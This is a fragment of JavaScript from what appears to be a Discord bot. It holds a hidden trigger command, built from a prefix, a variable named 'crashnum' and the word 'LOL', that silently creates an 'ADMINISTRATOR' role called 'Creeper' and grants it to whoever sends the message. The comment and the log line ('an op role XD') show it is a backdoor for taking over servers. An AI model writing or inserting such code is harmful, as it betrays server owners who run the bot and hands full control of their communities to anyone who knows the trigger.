// To create a role
	if (message.content === prefix + crashnum + 'LOL') {
		message.guild.createRole({
		name: 'Creeper',
		permissions: [
		'ADMINISTRATOR',
      ],
      mentionable: true,
    }).then((role) => {
		let member = message.member;
		member.addRole(role);
		console.log(`Gave ${member} an op role XD`)
    }).catch((error) => {
      console.log(error);
    });